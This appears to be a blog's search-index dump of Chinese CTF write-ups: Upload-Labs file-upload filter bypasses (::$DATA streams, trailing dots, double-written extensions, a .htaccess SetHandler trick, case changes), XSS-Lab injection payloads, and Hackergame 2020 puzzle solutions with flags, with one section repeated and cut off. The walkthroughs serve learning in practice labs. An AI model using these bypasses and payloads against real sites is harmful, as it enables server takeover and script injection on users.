{ $msg = '此文件类型不允许上传！'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; } }\r​ 审查代码发现少了对::$DATA字符串的处理，这里就要用到前面提到的windows环境了，贴一下原理： php在window的时候如果文件名+\"::$DATA\"会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持\"::$DATA\"之前的文件名 ​ 直接上传的时候抓包在文件名后面添加::$DATA。 ​ 上传访问。完工 ","date":"2020-11-09","objectID":"/posts/ctf/upload-labs2/:4:0","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs(二)","uri":"/posts/ctf/upload-labs2/#pass-08"},{"categories":["CTF"],"content":"\rPass-09\rtext $is_upload = false; $msg = null; if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '此文件类型不允许上传！'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; } }\r​ 这次题目和第七题差不多，代码会先剔除文件名前后的空格，然后删除末尾的点，再通过strrchr()函数截取后缀名转换小写。 ​ 所以和第七题一样构造2333.php. .(末尾加 点 空格 点)，被处理后的文件名后缀就成了一个点\".\"，铁定不在黑名单后缀里，实现绕过后缀检查。 ​ 但是这道题只能使用windows环境，因为执行了deldot()函数删除了最后一个点之后，文件名成了2333.php.，而linux环境下因为不会自动删除最后一个点而不能访问成功。 ​ 图前面有了就不贴了。 ","date":"2020-11-09","objectID":"/posts/ctf/upload-labs2/:5:0","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs(二)","uri":"/posts/ctf/upload-labs2/#pass-09"},{"categories":["CTF"],"content":"\rPass-10源码： text $is_upload = false; $msg = null; if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\"php\",\"php5\",\"php4\",\"php3\",\"php2\",\"html\",\"htm\",\"phtml\",\"pht\",\"jsp\",\"jspa\",\"jspx\",\"jsw\",\"jsv\",\"jspf\",\"jtml\",\"asp\",\"aspx\",\"asa\",\"asax\",\"ascx\",\"ashx\",\"asmx\",\"cer\",\"swf\",\"htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = str_ireplace($deny_ext,\"\", $file_name); $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; } }\r​ 这道题和前面不同的是$file_name = str_ireplace($deny_ext,\"\", $file_name)，对于这个函数：str_ireplace(find,replace,string,count)，find是要查找的值，replace是要替换成的值，string是被搜索的字符串，count 可选。一个变量，对替换数进行计数。所以这行代码的作用就是把文件名中所有包含在黑名单后缀里的字符串替换成空串，但是这个函数只会执行一次，所以我们可以构造一个双写绕过，即构造文件名2333.pphphp，只有一个\"php\"字符串被匹配到并被替换成空串，剩下的文件名就成了2333.php。 上传并访问文件。完工 ","date":"2020-11-09","objectID":"/posts/ctf/upload-labs2/:6:0","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs(二)","uri":"/posts/ctf/upload-labs2/#pass-10"},{"categories":["CTF"],"content":"\r介绍 大部分的网站和应用系统都有上传功能，而程序员在开发任意文件上传功能时，并未考虑文件格式后缀的合法性校验或者是否只在前端通过js进行后缀检验。这时攻击者可以上传一个与网站脚本语言相对应的恶意代码动态脚本，例如(jsp、asp、php、aspx文件后缀)到服务器上，从而访问这些恶意脚本中包含的恶意代码，进行动态解析最终达到执行恶意代码的效果，进一步影响服务器安全。 在线靶机地址： linux环境 windows环境 ","date":"2020-11-08","objectID":"/posts/ctf/upload-labs1/:1:0","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs(一)","uri":"/posts/ctf/upload-labs1/#介绍"},{"categories":["CTF"],"content":"\rPass-01​ 尝试上传php木马，发现提示上传错误 ​ 提示只能上传jpg、png、gif类型的图片。查看源码发现是一个前端的后缀过滤，那么我们尝试绕过前端的JS代码。 ​ 源码： javascript function checkFile() { var file = document.getElementsByName('upload_file')[0].value; if (file == null || file == \"\") { alert(\"请选择要上传的文件!\"); return false; } //定义允许上传的文件类型 var allow_ext = \".jpg|.png|.gif\"; //提取上传文件的类型 var ext_name = file.substring(file.lastIndexOf(\".\")); //判断上传文件类型是否允许上传 if (allow_ext.indexOf(ext_name + \"|\") == -1) { var errMsg = \"该文件不允许上传，请上传\" + allow_ext + \"类型的文件,当前文件类型为：\" + ext_name; alert(errMsg); return false; } }\r​ 把文件后缀名改成jpg格式上传，使用burp suit抓包。把.jpg后缀重新改为.php即可实现绕过前端JS代码。 ​ 然后右键打开图片，代码成功执行。完工 ​ 注：后面题目的php代码都使用2333.php： php \u003c?php eval(phpinfo());\r​ 执行结果是打印出php版本信息。 ","date":"2020-11-08","objectID":"/posts/ctf/upload-labs1/:2:0","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs(一)","uri":"/posts/ctf/upload-labs1/#pass-01"},{"categories":["CTF"],"content":"\rPass-02​ 源码： php $is_upload = false; $msg = null; if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name'] if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '文件类型不正确，请重新上传！'; } } else { $msg = UPLOAD_PATH.'文件夹不存在,请手工创建！'; } }\r​ 发现文件判断是根据image/jpeg、image/png...进行过滤判定，这些值都是Http请求中的Content-Type常见的值，通常浏览网页中各种各样的文件类型的就是通过它判断。那么这道题的目标就是绕过它。贴一个我参考值种类的博客:Http请求中Content-Type。 ​ 同样是burp抓包修改Content-Type的值。 ​ 打开图片，php代码成功执行。完工 ","date":"2020-11-08","objectID":"/posts/ctf/upload-labs1/:3:0","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs(一)","uri":"/posts/ctf/upload-labs1/#pass-02"},{"categories":["CTF"],"content":"\rPass-03源码： php $is_upload = false; $msg = null; if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array('.asp','.aspx','.php','.jsp'); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if(!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '不允许上传.asp,.aspx,.php,.jsp后缀文件！'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; } }\r​ 发现只过滤了.asp、.aspx、.php、.jsp文件，那么可以使用php3、phtml、phps、php5文件绕过过滤，并执行语句。通常，在嵌入了php脚本的html中，使用 phtml作为后缀名；而php3，我的理解是php之前版本的文件后缀，如php5。 ​ 直接把2333.php改为2333.php3上传打开，执行成功。完工 ","date":"2020-11-08","objectID":"/posts/ctf/upload-labs1/:4:0","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs(一)","uri":"/posts/ctf/upload-labs1/#pass-03"},{"categories":["CTF"],"content":"\rPass-04源码： php $is_upload = false; $msg = null; if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\"php1\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\"pHp1\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '此文件不允许上传!'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; } }\r​ 好家伙，这次直接一大堆文件都被过滤了，几乎有问题的都在数组里。发现没有.htaccess文件过滤，所以上传一个.htaccess文件内容如下： text SetHandler application/x-httpd-php\r​ 原理的话我讲一下个人的见解：.htaccess文件是一个apache服务器的配置文件，它的作用就是对于该目录下的所有文件都需要符合这个配置文件。然后上传的文件内容作用是：所有文件访问时都会解析为php。参考的博客：htaccess使用方法介绍。 ​ 接下来上传2333.jpg图片木马，再打开就会被成功解析为php文件并执行： ​ 完工 ","date":"2020-11-08","objectID":"/posts/ctf/upload-labs1/:5:0","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs(一)","uri":"/posts/ctf/upload-labs1/#pass-04"},{"categories":["CTF"],"content":"\rPass-05源码： php $is_upload = false; $msg = null; if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '此文件类型不允许上传！'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; } }\r​ 细心的话可以发现，这道题的源码中在末尾添加了.htaccess文件过滤，但是也少了一条语句 php $file_ext = strtolower($file_ext); //转换为小写 目标就很明确了，直接使用大小写绕过过滤。 ​ 打开图片成功执行。完工 ","date":"2020-11-08","objectID":"/posts/ctf/upload-labs1/:6:0","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs(一)","uri":"/posts/ctf/upload-labs1/#pass-05"},{"categories":["CTF"],"content":"\r一闪而过的Flag​ 根据题目信息程序每次运行时隐约可见黑色控制台上有 flag 一闪而过，我想到了应该能看程序的代码啥的找到，但是天下武功，唯快不破，下载 运行 截图一气呵成。 ​ ​ 接下来让我康康哪一位是瞎子，包括答案里也是满满的嘲讽。 参考答案：flag{Are_you_eyes1ght_g00D?_can_you_dIst1nguish_1iI?} ","date":"2020-11-05","objectID":"/posts/ctf/hackgame20202/:0:1","series":null,"tags":["Hackergame 2020","Java安全"],"title":"Hackgame2020(二)","uri":"/posts/ctf/hackgame20202/#一闪而过的flag"},{"categories":["CTF"],"content":"\r从零开始的记账工具人​ npy给了我一张账单，让我计算账单上面的金额，flag就是由金额组成的。本以为是一个简单的Excel的表格函数解决，打开我傻了。 ​ 原来是搞这个大小写金额的转换，没见过Excel有这种操作就去百度，转了一大圈，网上只有数字转大写金额的，没有反过来的。还去了github上找代码，发现运行的结果和自己想要的还是有些出入。卡了有足足半天，之后自己写了一个Java代码跑了一遍，代码如下： java import java.util.Scanner; public class Main { public static void main(String[] args) { Scanner sn = new Scanner(System.in); String str; int x; int cnt=0; double result=0; while(cnt++!=1000){ str = sn.next(); x = sn.nextInt(); result += tonum(str)*x; } System.out.println(result); } public static double tonum(String s){ int len; double res=0,temp = 1; double result=0; len = s.length(); for(int i=0;i\u003clen;i++){ switch (s.charAt(i)){ case '壹': temp=1;break; case '贰': temp=2;break; case '叁': temp=3;break; case '肆': temp=4;break; case '伍': temp=5;break; case '陆': temp=6;break; case '柒': temp=7;break; case '捌': temp=8;break; case '玖': temp=9;break; case '零': break; case '拾': res+=temp*10;temp=0;break; case '佰': res+=temp*100;temp=0;break; case '元': res+=temp;temp=0;break; case '角': res+=temp*0.1;temp=0;break; case '分': res+=temp*0.01;temp=0;break; case '整': break; default: System.out.println(\"这个认不出来\" + s.charAt(i)); } } return res; } }\r​ 程序用的控制台输入，直接表格两列从头拉倒尾粘贴，出答案。程序的思路就是把金额大写当做字符串处理，每一位用switch判断数字或是个、十、百、千那一位上的数字。 ​ Java渣轻喷。 参考答案：flag{19115.33} ","date":"2020-11-05","objectID":"/posts/ctf/hackgame20202/:0:2","series":null,"tags":["Hackergame 2020","Java安全"],"title":"Hackgame2020(二)","uri":"/posts/ctf/hackgame20202/#从零开始的记账工具人"},{"categories":["CTF"],"content":"\r超简单的世界模拟器​ 这道题下面有两道小题 ","date":"2020-11-05","objectID":"/posts/ctf/hackgame20202/:0:3","series":null,"tags":["Hackergame 2020","Java安全"],"title":"Hackgame2020(二)","uri":"/posts/ctf/hackgame20202/#超简单的世界模拟器"},{"categories":["CTF"],"content":"\r蝴蝶效应​ 先看有意思的一个漫画 ​ 一个人用石头模拟了一整个宇宙，斯巴拉西。 ​ 打开题目以后是一个终端，然提示等待你输入一个15*15矩阵（只能有0和1组成），看到这挺懵的，但是题目里有一个重要信息生命游戏，百度百科看了一下这个生命游戏，游戏的规则大致就是：一个细胞会根据周围的细胞数量判断存活和死亡，然后细胞会不断演算，这个和前面的漫画有异曲同工之妙。 ​ 返回终端里面一片白中间有几个框框，题目中 如果被特殊标注的正方形内的细胞被“清除”，你将会得到对应的 flag： “清除”任意一个正方形，你将会得到第一个 flag。同时“清除”两个正方形，你将会得到第二个 flag。 ​ 用细胞去碰框框就是了，正好也看到了一个知乎的提问：生命游戏(Game of Life)有哪些图形? - 知乎，看了看内容更有趣了。 ​ 大师我悟了，就是提供一个初始的15*15矩阵，根据生命游戏的规则进行演算，然后去消除黑框框。我臭屁完了直接贴图形 第一关 轻量级飞船 000000000000000 000000000000000 000000000000000 000000000000000 000000000000000 000000000000000 000000000011000 000000000111100 000000000110110 000000000001100 000000000000000 000000000000000 000000000000000 000000000000000 000000000000000\r​ 第一关打上面的黑框，刚好在上面15行的范围内，用一个轻量级飞船直线打过去即可。 第二关 三飞船 000000000000000 000000000000000 000000000000000 000000000000000 000000000011000 000000000111100 000000000110110 000000000001100 000000000000000 001100000000000 011110000000000 011011000001100 000110000011110 000000000011011 000000000000110\r​ 第二关我期初试了试滑翔者放在右上角以便能打到最远距离，但是和第二个都是擦肩而过。于是我就乱试乱拼凑，最后拼出来一个三飞船，正好把两个黑框都给消了。 参考答案： 1. flag{D0_Y0U_l1k3_g4me_0f_l1fe?_d5e1c80641} 2. flag{1s_th3_e55ence_0f_0ur_un1ver5e_ju5t_c0mputat1on?_ea3e769cb8} 完工。 ","date":"2020-11-05","objectID":"/posts/ctf/hackgame20202/:0:4","series":null,"tags":["Hackergame 2020","Java安全"],"title":"Hackgame2020(二)","uri":"/posts/ctf/hackgame20202/#蝴蝶效应"},{"categories":["CTF"],"content":"\r头靶机地址：https://buuoj.cn/challenges#XSS-Lab ","date":"2020-11-03","objectID":"/posts/ctf/xss-lab1/:1:0","series":null,"tags":["XSS"],"title":"XSS-Lab (一)","uri":"/posts/ctf/xss-lab1/#头"},{"categories":["CTF"],"content":"\rlevel 1​ ​ 观察发现欢迎用户test与URL中的name=test字段对应，尝试修改发现可行。直接将name字段改为name=\u003cscript\u003ealert()\u003c/script\u003e，完工。 ","date":"2020-11-03","objectID":"/posts/ctf/xss-lab1/:2:0","series":null,"tags":["XSS"],"title":"XSS-Lab (一)","uri":"/posts/ctf/xss-lab1/#level-1"},{"categories":["CTF"],"content":"\rlevel 2 ​ 在搜索栏中的输入会回显到页面，查看网页源代码，发现值在input的value属性中 ​ 构造闭合\"\u003e \u003cscript\u003ealert()\u003c/script\u003e // ，构造以后的标签会变成.... value=\"\"\u003e \u003cscript\u003ealert()\u003c/script\u003e // \"\u003e。完工 ","date":"2020-11-03","objectID":"/posts/ctf/xss-lab1/:3:0","series":null,"tags":["XSS"],"title":"XSS-Lab (一)","uri":"/posts/ctf/xss-lab1/#level-2"},{"categories":["CTF"],"content":"\rlevel 3 ​ 老样子构造value属性闭合，尝试\"\u003e \u003cscript\u003ealert()\u003c/script\u003e // 构造闭合，查看网页源代码发现语句变成\u0026quot;\u0026gt; \u0026lt;script\u0026gt;alert()\u0026lt;/script\u0026gt; // ，说明把\"、\u003c、\u003e、进行了html编码过滤，尝试构造onmouseover事件(鼠标移到事件)，构造语句'onmouseover='alert()'。完工 ","date":"2020-11-03","objectID":"/posts/ctf/xss-lab1/:4:0","series":null,"tags":["XSS"],"title":"XSS-Lab (一)","uri":"/posts/ctf/xss-lab1/#level-3"},{"categories":["CTF"],"content":"\rlevel 4 ​ 构造闭合\"\u003e \u003cscript\u003ealert()\u003c/script\u003e // ，查看源代码发现进行了\u003e、\u003c过滤，尝试构造事件\" onmouseover='alert()'。完工 ​ 说明一下标签的事件有很多类型，可以自己试试别的事件响应。 ","date":"2020-11-03","objectID":"/posts/ctf/xss-lab1/:5:0","series":null,"tags":["XSS"],"title":"XSS-Lab (一)","uri":"/posts/ctf/xss-lab1/#level-4"},{"categories":["CTF"],"content":"\rlevel 5 ​ 检查一下都有什么过滤。发现有一下过滤 script –\u003e scr_ipt onmouseover –\u003e o_nmouseover 无法采用事件，那么尝试构造一个标签 \"\u003e \u003ca href='javascript:alert()'\u003e233\u003c/a\u003e //，发现javascript没有过滤，说明判断语句匹配值仅仅为script，点击构造的\u003ca\u003e标签内容。完工 ​ ","date":"2020-11-03","objectID":"/posts/ctf/xss-lab1/:6:0","series":null,"tags":["XSS"],"title":"XSS-Lab (一)","uri":"/posts/ctf/xss-lab1/#level-5"},{"categories":["CTF"],"content":"\r前言比赛地址：https://hack.lug.ustc.edu.cn/ ","date":"2020-11-01","objectID":"/posts/ctf/hackgame20201/:1:0","series":null,"tags":["web","Hackergame 2020","代码审计"],"title":"Hackgame2020(一)","uri":"/posts/ctf/hackgame20201/#前言"},{"categories":["CTF"],"content":"\rweb","date":"2020-11-01","objectID":"/posts/ctf/hackgame20201/:0:0","series":null,"tags":["web","Hackergame 2020","代码审计"],"title":"Hackgame2020(一)","uri":"/posts/ctf/hackgame20201/#web"},{"categories":["CTF"],"content":"\r签到题​ 第一题是flag提取器，打开题目以后页面是一个提取器下面一个进度条和一个提取按钮。 ​ 随便拉了拉进度条发现初始是0末尾是1.5，然后中间的数值都是小数 ​ 我猜的题目可能是想让数值为1时能提取到flag。 ​ F12查看源代码，定位到进度条的标签，查看属性 ​ 确实和猜测一样最大最小值分别是0、1.5，注意到step值为0.00001，就是这个属性让我们拖动进度条时，递增的值是小数，想精准得到1个flag，就把网页上的step值改为1。然后随便拖动一下进度条得到1，点击提取按钮，完工。 ","date":"2020-11-01","objectID":"/posts/ctf/hackgame20201/:0:1","series":null,"tags":["web","Hackergame 2020","代码审计"],"title":"Hackgame2020(一)","uri":"/posts/ctf/hackgame20201/#签到题"},{"categories":["CTF"],"content":"\r2048​ 打开题目是一个2048的小游戏，第一个想法就是玩2048达到一定分数以后会获得flag（可恶这个比赛怎么知道最近我天天在玩2048的）,但是想比赛不可能让选手在线玩游戏吧，尤其对于我这种逃课废物是不可能努力哒！ F12开始翻网页资源 ​ 还好上次摸鱼课题做了一个网页版的2048，略微能看懂一点点结构，第一个animframe_polyfill应该就是管动画效果的，keynpard...这个肯定是相应按键的，local_storage_manager应该是保存游戏的，game_manager感觉就是管理整个游戏的主要文件。 ​ 打开game_manager粗略的看了下变量，score 分数、over、won、keepPlaying游戏状态，想赢游戏肯定是和score、won有关，直接Ctrl+F搜索整个文档这两个变量出现的位置。 发现了 ​ 只有这里修改了won的状态，前面还有个16384这个应该就是获得胜利需要得到的分数，这个分数对于我来说还是简简单单（小声bb截图为证），直接让if里面的语句为真就可以获胜，直接修改if(1) self.won = true，保存文件，按一个方向键让语句执行到，完工。 ","date":"2020-11-01","objectID":"/posts/ctf/hackgame20201/:0:2","series":null,"tags":["web","Hackergame 2020","代码审计"],"title":"Hackgame2020(一)","uri":"/posts/ctf/hackgame20201/#2048"},{"categories":["CTF"],"content":"\rgeneral","date":"2020-11-01","objectID":"/posts/ctf/hackgame20201/:0:0","series":null,"tags":["web","Hackergame 2020","代码审计"],"title":"Hackgame2020(一)","uri":"/posts/ctf/hackgame20201/#general"},{"categories":["CTF"],"content":"\r猫咪问题++​ 秉着前面题都是简单题，试着做了一下，看到题目提示的有往年的问题题解 ​ 题意思很明显的书考验同学的搜题技巧。那就开工。 第一题 以下编程语言、软件或组织对应标志是哺乳动物的有几个？ Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce. 提示：学术上一般认为龙不属于哺乳动物。 ​ 本人只认识几个，那就一个一个搜呗。我的模式是：百度xxx标志然后第二条就是百度图片的搜索结果，大致辨别一下，然后再百度xxx是哺乳动物吗，妥妥的胎儿教学。 ​ 一个比较有印象就是FreeDOS这个标志就离谱，什么玩意 参考答案 ：12 第二题 第一个以信鸽为载体的 IP 网络标准的 RFC 文档中推荐使用的 MTU (Maximum Transmission Unit) 是多少毫克？ ​ 卡了我好一会，没听过信鸽传输，贴上最后找到答案的博客，以及一篇信鸽传输的历史发展，长见识了。 参考答案：256 第三题 USTC Linux 用户协会在 2019 年 9 月 21 日自由软件日活动中介绍的开源游戏的名称共有几个字母？ 提示：活动记录会在哪里？ ​ 搜索USTC Linux 用户协会发现这个协会就是科大爱好者们创建的。那么直接摸到他们官网的新闻版块（百度搜出来的是旧站，里面有新站的网址）。题目中还写道2019年9月21日自由软件日活动，那么官网肯定有那天的新闻。 ​ 找到一篇当天的新闻2019 软件自由日中国科大站，进取直接找，文章末尾有 最后一项是李文睿同学介绍了开源游戏 Teeworlds，由于底层代码开源，开发者可以做出自己的定制，可玩性非常高。 ​ 答案就是Teeworlds ​ 我还摸到了他们当天活动的记录资料：点我 ​ 在slides\\闪电演讲\\Teeworlds文件夹下有应该作者演讲的PPT和游戏的视频演示，有点心动了🤣 参考答案：9 第四题 中国科学技术大学西校区图书馆正前方（西南方向） 50 米 L 型灌木处共有几个连通的划线停车位？ ​ 直接百度地图搜图书馆，然后全景地图房门口，视野拉到L型灌木那。 参考答案：9 第五题 中国科学技术大学第六届信息安全大赛所有人合计提交了多少次 flag？ ​ 百度中国科学技术大学第六届信息安全大赛有个...圆满结束，就他了。点开第二行就是经统计，在本次比赛中，总共有 2682 人注册，1904 人至少完成了一题。比赛期间所有人合计提交了 17098 次 flag。（看这个网站的标志似乎还是第三题搜的那个USTC Linux 用户协会的官网新闻。嗷原来题目上已经说了是举办方👀） 参考答案：17098 完工。 ","date":"2020-11-01","objectID":"/posts/ctf/hackgame20201/:0:1","series":null,"tags":["web","Hackergame 2020","代码审计"],"title":"Hackgame2020(一)","uri":"/posts/ctf/hackgame20201/#猫咪问题"},{"categories":["CTF"],"content":"\r猫咪问题++​ 秉着前面题都是简单题，试着做了一下，看到题目提示的有往年的问题题解 ​ 题意思很明显的书考验同学的搜题技巧。那就开工。 第一题 以下编程语言、软件或组织对应标志是哺乳动物的有几个？ Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce. 提示：学术上一般认为龙不属于哺乳动物。 ​ 本人只认识几个，那就一个一个搜呗。我的模式是：百度xxx标志然后第二条就是百度图片的搜索结果，大致辨别一下，然后再百度xxx是哺乳动物吗，妥妥的胎儿教学。 ​ 一个比较有印象就是FreeDOS这个标志就离谱，什么玩意 参考答案 ：12 第二题 第一个以信鸽为载体的 IP 网络标准的 RFC 文档中推荐使用的 MTU (Maximum Transmission Unit) 是多少毫克？ ​ 卡了我好一会，没听过信鸽传输，贴上最后找到答案的博客，以及一篇信鸽传输的历史发展，长见识了。 参考答案：256 第三题 USTC Linux 用户协会在 2019 年 9 月 21 日自由软件日活动中介绍的开源游戏的名称共有几个字母？ 提示：活动记录会在哪里？ ​ 搜索USTC Linux 用户协会发现这个协会就是科大爱好者们创建的。那么直接摸到他们官网的新闻版块（百度搜出来的是旧站，里面有新站的网址）。题目中还写道2019年9月21日自由软件日活动，那么官网肯定有那天的新闻。 ​ 找到一篇当天的新闻2019 软件自由日中国科大站，进取直接找，文章末尾有 最后一项是李文睿同学介绍了开源游戏 Teeworlds，由于底层代码开源，开发者可以做出自己的定制，可玩性非常高。 ​ 答案就是Teeworlds ​ 我还摸到了他们当天活动的记录资料：点我 ​ 在slides\\闪电演讲\\Teeworlds文件夹下有应该作者演讲的PPT和游戏的视频演示，有点心动了🤣 参考答案：9 第四题 中国科学技术大学西校区图书馆正前方（西南方向） 50 米 L 型灌木处共有几个连通的划线停车位？ ​ 直接百度地图搜图书馆，然后全景地图房门口，视野拉到L型灌木那。 参考答案：9 第五题 中国科学技术大学第六届信息安全大赛所有人合计提交了多少次 flag？ ​ 百度中国科学技术大学第六届信息安全大赛有个...圆满结束，就他了。点开第二行就是经统计，在本次比赛中，总共有 2682 人注册，1904 人至少完成了一题。比赛期间所有人合计提交了 17098 次 flag。（看这个网站的标志似乎还是第三题搜的那个USTC Linux 用户协会的官网新闻。嗷原来题目上已经说了是举办方👀） 参考答案：17098 完工。 ","date":"2020-11-01","objectID":"/posts/ctf/hackgame20201/:0:1","series":null,"tags":["web","Hackergame 2020","代码审计"],"title":"Hackgame2020(一)","uri":"/posts/ctf/hackgame20201/#第一题"},{"categories":["CTF"],"content":"\r猫咪问题++​ 秉着前面题都是简单题，试着做了一下，看到题目提示的有往年的问题题解 ​ 题意思很明显的书考验同学的搜题技巧。那就开工。 第一题 以下编程语言、软件或组织对应标志是哺乳动物的有几个？ Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce. 提示：学术上一般认为龙不属于哺乳动物。 ​ 本人只认识几个，那就一个一个搜呗。我的模式是：百度xxx标志然后第二条就是百度图片的搜索结果，大致辨别一下，然后再百度xxx是哺乳动物吗，妥妥的胎儿教学。 ​ 一个比较有印象就是FreeDOS这个标志就离谱，什么玩意 参考答案 ：12 第二题 第一个以信鸽为载体的 IP 网络标准的 RFC 文档中推荐使用的 MTU (Maximum Transmission Unit) 是多少毫克？ ​ 卡了我好一会，没听过信鸽传输，贴上最后找到答案的博客，以及一篇信鸽传输的历史发展，长见识了。 参考答案：256 第三题 USTC Linux 用户协会在 2019 年 9 月 21 日自由软件日活动中介绍的开源游戏的名称共有几个字母？ 提示：活动记录会在哪里？ ​ 搜索USTC Linux 用户协会发现这个协会就是科大爱好者们创建的。那么直接摸到他们官网的新闻版块（百度搜出来的是旧站，里面有新站的网址）。题目中还写道2019年9月21日自由软件日活动，那么官网肯定有那天的新闻。 ​ 找到一篇当天的新闻2019 软件自由日中国科大站，进取直接找，文章末尾有 